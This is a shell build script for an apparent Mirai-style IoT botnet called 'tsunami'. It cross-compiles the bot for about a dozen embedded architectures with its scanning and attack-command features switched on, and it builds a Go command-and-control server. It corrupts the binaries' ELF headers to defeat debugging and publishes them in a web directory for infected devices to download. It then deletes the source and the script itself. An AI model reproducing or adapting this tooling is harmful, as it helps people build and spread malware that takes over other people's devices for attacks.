#!/bin/bash
echo "EXPORTING PATHS"
export PATH=$PATH:/etc/xcompile/armv4l/bin
export PATH=$PATH:/etc/xcompile/armv5l/bin
export PATH=$PATH:/etc/xcompile/armv6l/bin
export PATH=$PATH:/etc/xcompile/armv7l/bin
export PATH=$PATH:/etc/xcompile/i586/bin
export PATH=$PATH:/etc/xcompile/m68k/bin
export PATH=$PATH:/etc/xcompile/mips/bin
export PATH=$PATH:/etc/xcompile/mipsel/bin
export PATH=$PATH:/etc/xcompile/powerpc/bin
export PATH=$PATH:/etc/xcompile/sh4/bin
export PATH=$PATH:/etc/xcompile/sparc/bin
export GOROOT=/usr/local/go; export GOPATH=$HOME/Projects/Proj1; export PATH=$GOPATH/bin:$GOROOT/bin:$PATH; go get github.com/go-sql-driver/mysql; go get github.com/mattn/go-shellwords
sleep 1s



output_dir="output"
debug=""
command="-DTSUNAMI_COMMAND"
eh_frame_ptr="--remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr"
scan="-DTSUNAMI_SCAN -w"
sleep 1s



compile_bot()
{
    echo "[build] Building $1..."
    # Dont strip the frame pointer it causes issues when building arm7
    if [ $1 == "armv7l" ]; then eh_frame_ptr=""; fi
    "$1-gcc" -static $6 tsunami/bot/*.c $scan $command -Os $debug -fomit-frame-pointer -fdata-sections -D BOT_ARCH=\"$4\" -D ARCH_LEN=$5 -ffunction-sections -Wl,--gc-sections -o $output_dir/$2
    "$1-strip" -S --strip-unneeded --remove-section=.ARM.attributes --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt $eh_frame_ptr $output_dir/$2
    if [ -f $output_dir/$2 ]; then tools/anti_debug$3 $output_dir/$2; echo "[build] Built $1 wrote to $output_dir/$2, corrupted ELF $3 bit section header, we can now be used."; return; fi
    echo "[build] Failed to build $1."
    return
}
sleep 1s



echo "CREATING DIRECTORIES"
sleep 1s
rm -rf /var/www/html 
mkdir /var/www/html 
mkdir /var/www/html/bins
mkdir ~/reeeeee
go build -o reeeeee/cnc cnc/*.go
go build r.go -o r 
gcc tools/anti_debug.c -o tools/anti_debug64 -s -Os -D ELF_64
gcc tools/anti_debug.c -o tools/anti_debug32 -s -Os -D ELF_32
sleep 1s


echo "Compiling: i586"
compile_bot i586 x86.tsunami
echo "Compiling: mips"
compile_bot mips mips.tsunami 
echo "Compiling: mipsel"
compile_bot mipsel mpsl.tsunami
echo "Compiling: armv4l"
compile_bot armv4l arm.tsunami
echo "Compiling: armv5l"
compile_bot armv5l arm5.tsunami
echo "Compiling: armv6l"
compile_bot armv6l arm6.tsunami
echo "Compiling: armv7l"
compile_bot armv7l arm7.tsunami
echo "Compiling: powerpc"
compile_bot powerpc ppc.tsunami
echo "Compiling: sparc"
compile_bot sparc spc.tsunami
echo "Compiling: m68k"
compile_bot m68k m68k.tsunami
echo "Compiling: sh4"
compile_bot sh4 sh4.tsunami
echo "Compiling: a.out"
gcc -g tsunami/bot/*.c -oa.out -DDEBUG -DTSUNAMI_COMMAND -DTSUNAMI_SCAN -w 


cp ~/output/* /var/www/html/bins/


rm -rf ~/tsunami ~/tools/anti_debug.c ~/Projects ~/build.sh 
mv ~/reeeeee/* /
rm -rf ~/cnc
mv /cnc ~/
rm -rf /root/reeeeee


echo "Finished building tsunami"
sleep 2
echo "now go to cd dropper and run build.sh"
sleep 2


 